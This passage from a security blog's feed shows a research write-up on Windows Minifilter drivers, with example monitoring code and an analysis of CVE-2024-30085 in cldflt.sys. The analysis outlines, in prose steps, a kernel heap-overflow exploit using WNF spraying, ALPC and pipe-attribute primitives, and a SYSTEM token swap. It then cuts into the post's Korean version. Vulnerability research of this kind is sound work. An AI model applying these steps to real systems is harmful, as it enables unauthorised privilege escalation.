class="hljs-title">Unload</span><span class="hljs-params">(FLT_FILTER_UNLOAD_FLAGS Flags)</span> </span>{    UNREFERENCED_PARAMETER(Flags);    FltCloseCommunicationPort(gServerPort);    FltUnregisterFilter(gFilter);    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> </span>{    UNREFERENCED_PARAMETER(RegistryPath);    NTSTATUS status;    <span class="hljs-keyword">const</span> FLT_OPERATION_REGISTRATION Cbs[] = { { IRP_MJ_CREATE, <span class="hljs-number">0</span>, PreCreate, <span class="hljs-literal">NULL</span> }, { IRP_MJ_OPERATION_END } };    <span class="hljs-keyword">const</span> FLT_REGISTRATION Reg = { <span class="hljs-keyword">sizeof</span>(FLT_REGISTRATION), FLT_REGISTRATION_VERSION, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, Cbs, Unload };    status = FltRegisterFilter(DriverObject, &amp;Reg, &amp;gFilter);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) <span class="hljs-keyword">return</span> status;    UNICODE_STRING portName = RTL_CONSTANT_STRING(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>);    OBJECT_ATTRIBUTES oa = { <span class="hljs-keyword">sizeof</span>(oa), <span class="hljs-literal">NULL</span>, &amp;portName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span> };    status = FltCreateCommunicationPort(gFilter, &amp;gServerPort, &amp;oa, <span class="hljs-literal">NULL</span>, OnConnect, OnDisconnect, <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {        FltUnregisterFilter(gFilter);        <span class="hljs-keyword">return</span> status;    }    <span class="hljs-keyword">return</span> FltStartFiltering(gFilter);}</code></pre><p>Focusing on the representative driver code APIs <code>FltCreateCommunicationPort()</code>, <code>FltSendMessage()</code>, and <code>FltCloseCommunicationPort()</code>, I have implemented an example Minifilter driver code.</p><p>Let&#x2019;s walk through the flow together:</p><ol><li><p>The driver registers itself using <code>FltRegisterFilter()</code>.</p><p> At this stage, it specifies a <strong>PreCreateCallback</strong> function to monitor file creation and open (<code>IRP_MJ_CREATE</code>) requests, and starts I/O monitoring with <code>FltStartFiltering()</code>.</p></li><li><p>Using the <code>FltCreateCommunicationPort()</code> function, the driver can create a communication port.</p><p> In the code above, it creates the port <code>\\FileActivityMonitorPort</code>, which allows a User-Mode application to connect and receive notifications.</p></li><li><p>When a file create/open event occurs, <strong>PreCreateCallback</strong> is invoked, and the function collects information about which process accessed which file.</p></li><li>The driver then uses <code>FltSendMessage()</code> to immediately send the real-time file access information collected in <strong>PreCreateCallback</strong> to the connected User-Mode application.</li><li>Finally, in the <strong>FilterUnload</strong> routine, when the driver is unloaded, it closes the communication port with <code>FltCloseCommunicationPort()</code> and unregisters the filter.</li></ol><h3 id="User-Mode-Application-Code"><a href="#User-Mode-Application-Code" class="headerlink" title="User-Mode Application Code"></a>User-Mode Application Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltuser.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;fltlib.lib&quot;</span>)</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    HANDLE port;    HRESULT hr;        BYTE buffer[<span class="hljs-keyword">sizeof</span>(FILTER_MESSAGE_HEADER) + <span class="hljs-number">1024</span>];    PFILTER_MESSAGE_HEADER header = (PFILTER_MESSAGE_HEADER)buffer;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connecting to driver...\n&quot;</span>);    hr = FilterConnectCommunicationPort(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;port);    <span class="hljs-keyword">if</span> (IS_ERROR(hr)) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection failed. Error 0x%X\n&quot;</span>, hr);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected. Waiting for file events...\n&quot;</span>);    <span class="hljs-keyword">while</span> (TRUE) {        hr = FilterGetMessage(port, header, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-literal">NULL</span>);                <span class="hljs-keyword">if</span> (SUCCEEDED(hr)) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;File Accessed: %S\n&quot;</span>, (PWSTR)header-&gt;MessageBody);        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection lost. Error 0x%X\n&quot;</span>, hr);            <span class="hljs-keyword">break</span>;        }    }    CloseHandle(port);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>Let&#x2019;s now look at the communication flow from the User-Mode application side.</p><p>Representative APIs include <code>FilterConnectCommunicationPort()</code> and <code>FilterSendMessage()</code>.</p><ol><li>First, the application uses <code>FilterConnectCommunicationPort()</code> to connect to the Minifilter driver&#x2019;s communication port in the kernel, <code>\\FileActivityMonitorPort</code>, and obtains a HANDLE for communication.</li><li><p>It then calls <code>FilterGetMessage()</code> to directly receive the file path string from the driver.</p><p> If the message is received successfully, the application outputs the file path to the screen.</p></li></ol><h1 id="2-CVE-2024-30085-1-Day-Analysis"><a href="#2-CVE-2024-30085-1-Day-Analysis" class="headerlink" title="2. [CVE-2024-30085] 1-Day Analysis"></a>2. [CVE-2024-30085] 1-Day Analysis</h1><hr><p>This is a Windows Minifilter Driver vulnerability that was also introduced in &#x201C;1day1line&#x201D; (<a href="https://hackyboiz.github.io/2025/01/11/OUYA77/2025-01-11/">reference</a>).</p><p>Let&#x2019;s try to reproduce CVE-2024-30085 and, in the process, learn more about Minifilter drivers.</p><blockquote><p>&#x1FA9F; Environment: Windows 11 22H2/23H2 10.0.2261.3672</p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image4.png" alt></p><p>The Windows Cloud Files Mini Filter driver is responsible for the Windows cloud sync feature.</p><p>For example, I&#x2019;ve taken a screenshot of one of my folders.</p><p>To understand this Minifilter driver vulnerability, we first need some background knowledge about Stub Files and Reparse Points.</p><h3 id="What-is-a-Stub-File"><a href="#What-is-a-Stub-File" class="headerlink" title="What is a Stub File?"></a>What is a Stub File?</h3><p>A stub file refers to a file that exists only as a placeholder locally, without containing any actual data.</p><p>As shown in the image above, the &#x201C;Pictures&#x201D; folder has a blue cloud icon in its status &#x2014; this indicates that the file is in a stub state.</p><p>On NTFS, its size, name, and icon are displayed, but its actual contents are not stored locally.</p><h3 id="Reparse-Point-Metadata"><a href="#Reparse-Point-Metadata" class="headerlink" title="Reparse Point Metadata"></a>Reparse Point Metadata</h3><p>So, what happens when a user tries to access such a file?</p><p>NTFS checks the Reparse Tag and determines, <strong>&#x201C;Oh&#x2026; this is a stub file!&#x201D;</strong>.</p><p>At this point, the Windows Cloud Files Minifilter (<code>cldflt.sys</code>) reads the <code>Reparse Point</code> metadata structure and decides how to handle the file.</p><p>After that, the Minifilter prepares for communication with the remote server.</p><p>However, <code>cldflt.sys</code> itself does not communicate directly with the server &#x2014; instead, it delegates the actual work to a User-Mode process.</p><p>This matches the concept we saw earlier: the Minifilter plays the role of an I/O interpreter, while the User-Mode client handles the actual data manipulation.</p><p>I&#x2019;ve added the Windows Cloud Files Minifilter&#x2019;s Reparse Point structure definitions to Local Types.</p><p>Let&#x2019;s take a look at the CldFlt structure set I defined.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">REPARSE_DATA_BUFFER</span> {</span>    DWORD ReparseTag;    WORD ReparseDataLength;    WORD Reserved;    WORD Flags;    WORD UncompressedSize;    REPARSE_CLD_BUFFER ReparseCldBuffer;} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;</code></pre><p><code>REPARSE_DATA_BUFFER</code> is the standard header structure used to represent all Reparse Point data on NTFS.</p><p>Here, however, we use a redefined version to make analyzing Cloud Files easier.</p><p>This structure stores top-level metadata such as <code>ReparseTag</code> (to identify the owning driver), <code>ReparseDataLength</code>, and <code>Flags</code>, and then points to the actual data, which continues as an <code>HSM_REPARSE</code> structure.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_REPARSE</span> {</span>    USHORT hsmFlags;    USHORT hsmSize;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> <span class="hljs-title">fileData</span>;</span>};</code></pre><p><code>HSM_REPARSE</code> is the full container for a Cloud Files-specific Reparse Point.</p><p><code>hsmFlags</code> and <code>hsmSize</code> indicate whether compression is used and the total size of the HSM block.</p><p>The <code>fileData</code> field contains an <code>HSM_RP_DATA</code> structure.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> {</span>    ULONG magic;    ULONG crc32;    ULONG totalSize;    USHORT dataFlags;    USHORT elemCount;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> <span class="hljs-title">elements</span>[5];</span>};</code></pre><p><code>HSM_RP_DATA</code> is the main header, containing the layout and structure of the entire metadata block.</p><p><code>magic</code> identifies the data type, and if the CRC bit is set in <code>dataFlags</code>, <code>crc32</code> is validated using <code>RtlComputeCrc32</code>.</p><p>The <code>elements[]</code> array stores <code>HSM_RP_ELEMENT</code> structures that define the type, size, and offset of each metadata element.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> {</span>    USHORT elemType;    USHORT elemSize;    ULONG elemOffset;};<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> HSM_RP_ELEM_TYPE {    HSM_RP_ELEMENT_NONE   = <span class="hljs-number">0x00</span>,    HSM_RP_ELEMENT_U64    = <span class="hljs-number">0x06</span>,    HSM_RP_ELEMENT_BYTE   = <span class="hljs-number">0x07</span>,    HSM_RP_ELEMENT_U32    = <span class="hljs-number">0x0a</span>,    HSM_RP_ELEMENT_BITMAP = <span class="hljs-number">0x11</span>,    HSM_RP_ELEMENT_MAX    = <span class="hljs-number">0x12</span>} HSM_RP_ELEMENT_TYPE;</code></pre><p><code>HSM_RP_ELEMENT</code> defines each individual metadata element&#x2019;s type, size, and offset.</p><p>The <code>HSM_RP_ELEMENT_TYPE</code> enumeration is used to classify element types.</p><h2 id="2-1-Root-Cause-Analysis"><a href="#2-1-Root-Cause-Analysis" class="headerlink" title="2.1 Root Cause Analysis"></a>2.1 Root Cause Analysis</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image5.png" alt></p><p>The vulnerability occurs when a file is created and the <code>HsmFltPostCREATE</code> callback is executed to process the file&#x2019;s Reparse Point.</p><p>Within <code>HsmFltPostCREATE</code>, when handling the bitmap information stored in the Reparse Point, the function <code>HsmIBitmapNORMALOpen()</code> is called &#x2014; and this is where the flaw exists.</p><ul><li><code>bitmap_size</code> is read directly from the User-Mode request buffer.</li><li>A fixed-size buffer of 0x1000 bytes is allocated via <code>ExAllocatePoolWithTag</code>, but the user-controlled <code>bitmap_size</code> value is passed directly to <code>memmove</code> without any boundary checks.</li></ul><p>Therefore, if <code>bitmap_size</code> is greater than 0x1000, a Heap-based Buffer Overflow is expected to occur.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image6.png" alt></p><p>Looking at the <code>HsmpBitmapIsReparseBufferSupported()</code> function, it returns an error if <code>hdr-&gt;elements[4].elemSize</code> is greater than <code>0x1000</code>.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image7.png" alt></p><p>Looking a bit further up at the conditional statement code, we can see that <code>hdr-&gt;elements[2]</code> is being strictly validated. Checks such as <code>total &#x2265; 0x18</code> and <code>hdr-&gt;elemCount</code> boundary verification must all be passed in order to proceed. If these conditions are not met, it would return a failure, right?</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image8.png" alt></p><p>However, in the same function, if <code>hasBuf</code> is set to <code>false</code>, the code returns <code>result = 0</code> (success) simply by checking the 1-byte flag of <code>element[1]</code>, without performing any separate bitmap length validation. In this path, there is no check to determine whether the bitmap length exceeds <code>0x1000</code>, so the validation is skipped and the data is treated as valid.</p><h2 id="2-2-Exploit"><a href="#2-2-Exploit" class="headerlink" title="2.2 Exploit"></a>2.2 Exploit</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image9.png" alt></p><p>The <code>cldflt.sys</code> minifilter driver does not scan all file system I/O by default; instead, it only operates on paths within the Sync Root that are registered through the CfAPI. Therefore, the first step was to reach the root directory of a cloud sync folder by calling the <code>CfRegisterSyncRoot()</code> function.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image10.png" alt></p><p>Once the Sync Root registration code is built and executed, such a folder is created. Inside this folder, cloud stub files and metadata may appear, and this becomes the point I can exploit.</p><pre><code class="hljs c">-&gt; HsmFltPostCREATE()-&gt; HsmiFltPostECPCREATE()-&gt; HsmpSetupContexts()-&gt; HsmpCtxCreateStreamContext()-&gt; HsmIBitmapNORMALOpen()</code></pre><p>Through dynamic analysis, it was confirmed that in order to reach the vulnerable function <code>HsmIBitmapNORMALOpen()</code>, the execution must sequentially pass through the above function chain and satisfy all conditional checks. My goal, therefore, is to fulfill all those conditions and reach the vulnerable <code>memmove</code> inside <code>HsmIBitmapNORMALOpen()</code>.</p><blockquote><p>Understanding the Flow as a Minifilter Driver</p></blockquote><p>Earlier, I mentioned that a minifilter driver calls specific callbacks depending on the IRP code when an I/O request occurs. To enter the vulnerable path, the process must begin at the <code>IRP_MJ_CREATE</code> Post-Create Callback (<code>HsmFltPostCREATE</code>) and proceed sequentially to the target function. These intermediate functions validate entry conditions based on file/stream attributes and Reparse Point information, so we can bypass them by crafting a special file structure.</p><ol><li>Use <code>MakeDataBuffer()</code> to create an <code>IO_REPARSE_TAG_CLOUD</code> structure &#x2192; The minifilter recognizes the file as a cloud stub file and enters the Reparse Point parsing logic.</li><li>Set Item Tag = <code>0x11</code> (Bitmap) &#x2192; Configure <code>Size</code> to <code>0x1000 + overSize</code> to trigger a heap overflow in <code>memmove()</code> by copying more than the allocated size. Ensure that other elements (Tags <code>0x7</code>, <code>0x6</code>, <code>0xA</code>, etc.) are also set to pass the minifilter&#x2019;s boundary checks.</li><li>Include a fake kernel object pointer in the overflow data &#x2192; Apply it with <code>FSCTL_SET_REPARSE_POINT</code>, then trigger <code>HsmIBitmapNORMALOpen()</code> by calling <code>CreateFile()</code>.</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image11.png" alt></p><p>When these conditions are met, we can confirm that the flow starts from <code>FltMgr</code> and reaches <code>HsmIBitmapNORMALOpen()</code>.</p><p>I&#x2019;d like to cover the full exploit process, but since today&#x2019;s focus is on explaining the minifilter and I&#x2019;ve already gone overboard with the length&#x2026; let&#x2019;s wrap up with a summary of the entire exploit scenario.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image12.png" alt></p><blockquote><p>Proof of Concept Overview</p></blockquote><ol><li><p><strong>EPROCESS Structure Analysis and Token Field Offset Calculation</strong></p><p> Calculate the offset of the Token field within the EPROCESS structure to prepare for the subsequent SYSTEM token swap.</p></li><li><p><strong>First <code>WNF_STATE_DATA</code> Spray and Hole Creation</strong></p><p> Mass-allocate (<code>spray</code>) <code>WNF_STATE_DATA</code> objects of size 0x1000 (0xff0 data) and then free them to create heap holes in the kernel heap.</p></li><li><p><strong>Open Vulnerable Bitmap File and Trigger First Overflow</strong></p><p> Use <code>CfRegisterSyncRoot()</code> and manipulate the Reparse Point directory to prepare a vulnerable bitmap file within the Sync Root. Then, open the file with <code>CreateFile()</code> to reach the path:</p><p> <code>IRP_MJ_CREATE()</code> &#x2192; <code>HsmFltPostCREATE()</code> &#x2192; <code>HsmiFltPostECPCREATE()</code> &#x2192; <code>HsmpSetupContexts()</code> &#x2192; <code>HsmpCtxCreateStreamContext()</code> &#x2192; <code>HsmIBitmapNORMALOpen()</code></p><p> Trigger a heap overflow to modify the <code>DataSize</code> of an adjacent <code>WNF_STATE_DATA</code>, gaining OOB (Out-of-Bounds) read/write capability.</p></li><li><p><strong>Kernel Pointer Leak</strong></p><p> Use the modified <code>WNF_STATE_DATA</code> to read the <code>_KALPC_RESERVE</code> pointer and leak a kernel address.</p></li><li><p><strong>Second <code>WNF_STATE_DATA</code> Spray and Hole Creation</strong></p><p> Repeat the same spray-and-free process for <code>WNF_STATE_DATA</code> objects, but this time arrange for a <code>PipeAttribute</code> structure to be placed adjacent to the WNF object.</p></li><li><p><strong>Second Overflow to Manipulate <code>PipeAttribute</code></strong></p><p> Open a second bitmap file to trigger another heap overflow, overwriting the <code>Flink</code> pointer of the adjacent <code>PipeAttribute</code> with the address of a user-space fake <code>PipeAttribute</code> structure.</p></li><li><p><strong>Arbitrary Read to Retrieve EPROCESS/Token Addresses</strong></p><p> Use the fake <code>PipeAttribute</code> to access the ALPC Port structure, sequentially reading the EPROCESS address and Token address of the target process.</p></li><li><p><strong>Token Swapping and SYSTEM Privilege Escalation</strong></p><p> Perform an arbitrary write to replace the current process&#x2019;s Token value with the SYSTEM Token value, then launch <code>cmd.exe</code> with SYSTEM privileges.</p></li></ol><h3 id="ALPC-WNF"><a href="#ALPC-WNF" class="headerlink" title="ALPC / WNF"></a>ALPC / WNF</h3><p>The <code>_WNF_STATE_DATA</code> and <code>_ALPC_HANDLE_TABLE</code> structures are used to allocate arbitrary-sized kernel objects for heap holes and to leak kernel memory addresses. Since ALPC and WNF might be unfamiliar concepts, here is a brief explanation of the two subsystems relevant to this exploit:</p><blockquote><p><strong>ALPC (Asynchronous Local Procedure Call)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image13.webp" alt></p><p>ALPC is an inter-process communication (IPC) mechanism within the Windows kernel that uses client and server ports to exchange messages. By leveraging the <code>_ALPC_HANDLE_ENTRY</code> in the ALPC handle table, it is possible to store message buffer addresses. Since the size of this table is variable, it allows the creation of kernel objects of arbitrary size.</p><ul><li>When an ALPC port is created, an <code>_ALPC_HANDLE_TABLE</code> is allocated in the <strong>paged pool</strong> with a size of 0x80.</li><li>Each call to <code>NtAlpcCreateResourceReserve</code> creates a <code>_KALPC_RESERVE</code> object, and its address is added to the handle table.</li><li><p>By tampering with this structure, it becomes possible to obtain arbitrary kernel address read/write primitives.</p><p>  &#x2192; In the PoC, a fake <code>_KALPC_RESERVE</code> is injected to achieve arbitrary R/W.</p></li><li><p>ALPC handles can also be controlled from user mode, making them highly useful for exploitation.</p></li></ul><blockquote><p><strong>WNF (Windows Notification Facility)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image14.webp" alt></p><p>WNF is the Windows Notification Facility, and the <code>WNF_NAME_INSTANCE</code> kernel object contains an internal <code>_WNF_STATE_DATA</code> field whose size is variable. This allows direct control of the kernel object size from user mode using <code>NtCreateWnfStateName</code> + <code>NtUpdateWnfStateData</code>.</p><ul><li><code>_WNF_STATE_DATA</code> can be allocated with a size of 0x1000 (0x10 header + 0xFF0 data).</li><li>WNF objects can be mass-created for heap spraying, placing them adjacent to a target structure (e.g., an ALPC object).</li><li>In the PoC, WNF is used to create heap holes and then place them next to ALPC objects to trigger an overflow into the ALPC handle table.</li></ul><p>In particular, the PoC required registering a routine to create a pipe, which I found interesting.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PipeAttribute</span> {</span>    LIST_ENTRY <span class="hljs-built_in">list</span>;    <span class="hljs-keyword">char</span> *AttributeName;    <span class="hljs-keyword">uint64_t</span> AttributeValueSize;    <span class="hljs-keyword">char</span> *AttributeValue;    <span class="hljs-keyword">char</span> data[<span class="hljs-number">0</span>];};</code></pre><p>The pipe is configured so that the <code>AttributeValue</code> pointer in the modified <code>PipeAttribute</code> structure is set to a kernel memory address. This causes the kernel to read data from that address and return it to user mode. By combining the memory layout control achieved via ALPC with the WNF overflow, the pipe can be turned into an arbitrary read primitive, allowing leakage of kernel addresses.</p><h1 id="3-Conclusion"><a href="#3-Conclusion" class="headerlink" title="3. Conclusion"></a>3. Conclusion</h1><hr><p><img src="/2025/08/15/banda/Minifilter-Driver/en/image15.gif" alt></p><p>I&#x2019;ll wrap up by sharing the results of the LPE I implemented using the characteristics of the <code>cldflt.sys</code> Minifilter driver combined with the WNF + ALPC technique.</p><p>While studying Minifilters, I realized that although their operation, functions, and concepts may feel a bit unfamiliar, the way vulnerabilities are triggered and their root causes are, in the end, quite similar. So, there&#x2019;s no need to be too intimidated about diving into Minifilter exploitation!</p><p>If I get the chance, I&#x2019;d like to explore and study various other drivers I haven&#x2019;t looked into yet. I hope you&#x2019;ll look forward to my next write-up as well!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h1><hr><p><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/</a></p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts">https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts</a></p><p><a href="https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/">https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/">https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/</a></p><p><a href="https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true">https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true</a></p><p><a href="https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6">https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/Minifilter/">Minifilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-30085/">CVE-2024-30085</category>
      
      <category domain="https://hackyboiz.github.io/tags/CldFlt/">CldFlt</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 걸어서 Windows Minifilter Driver 속으로(KR)</title>
      <link>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/</guid>
      <pubDate>Fri, 15 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, banda&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Windows Minifilter Driver &amp;#xAE00;&amp;#xACFC; &amp;#xD568;&amp;#xAED8; &amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, banda&#xC785;&#xB2C8;&#xB2E4;. Windows Minifilter Driver &#xAE00;&#xACFC; &#xD568;&#xAED8; &#xCC98;&#xC74C; &#xC778;&#xC0AC;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;. &#x1F917;</p><p>&#xCD5C;&#xADFC; Windows Kernel Driver&#xC744; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xAC00; Bus Driver, Filter Driver, FSD, Minifilter&#xC640; &#xAC19;&#xC740; &#xBAA9;&#xC801;&#xC5D0; &#xB530;&#xB978; &#xB2E4;&#xC591;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC885;&#xB958;&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xC800;&#xB294; &#xAE30;&#xC874;&#xC758; Function Driver&#xC640; &#xB2EC;&#xB9AC; Bus Driver&#xC774;&#xB098; Filter Driver&#xC5D0;&#xC11C;&#xC758; &#xAD6C;&#xC870; &#xCC28;&#xC774;&#xC640;, &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB098;&#xB294;&#xC9C0; &#xAD81;&#xAE08;&#xD588;&#xB294;&#xB370;&#xC694;.</p><p>&#xC624;&#xB298;&#xC740; Minifilter Driver &#xAD6C;&#xC870;&#xC640; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;, &#xB0B4;&#xBD80; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC640; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image1.png" alt></p><h1 id="1-About-Minifilter-Drivers"><a href="#1-About-Minifilter-Drivers" class="headerlink" title="1. About Minifilter Drivers"></a>1. About Minifilter Drivers</h1><hr><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; Windows&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xC0DD;&#xC131;, &#xC5F4;&#xAE30;, &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xC0AD;&#xC81C;&#xC640; &#xAC19;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; I/O &#xC694;&#xCCAD;&#xC744; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xAC70;&#xB098; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xD2B9;&#xC218;&#xD55C; &#xBAA9;&#xC801;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C;, &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xD65C;&#xB3D9;&#xC744; &#xC815;&#xBC00;&#xD558;&#xAC8C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xB370;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><strong>&#x201C;&#xD30C;&#xC77C; &#xC811;&#xADFC;&#xC744; &#xAC10;&#xC2DC;&#xD558;&#xACE0;, &#xCC28;&#xB2E8;&#xD558;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD558;&#xB294; &#xAC83;&#x201D;</strong>&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xBA74;&#x2026; &#xC7A0;&#xC2DC;&#xB9CC;&#xC694;. <strong>Antivirus, EDR, &#xBC31;&#xC5C5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</strong>&#xACFC; &#xAC19;&#xC774; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC8FC; &#xBAA9;&#xC801;&#xC778; &#xC81C;&#xD488;&#xC5D0; &#xC801;&#xD569;&#xD574; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xB098;&#xC694;? &#xB9DE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xC0C1;&#xB2F9;&#xC218;&#xC758; &#xD574;&#xB2F9; &#xC81C;&#xD488;&#xB4E4;&#xC774; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xC2E4;&#xC81C;&#xB85C; &#xC81C;&#xAC00; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;.</p><p>Minifiler &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0; &#xC885;&#xB958;&#xC758; &#xC694;&#xCCAD;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>IRP (I/O Request Packet)</li><li>Fast 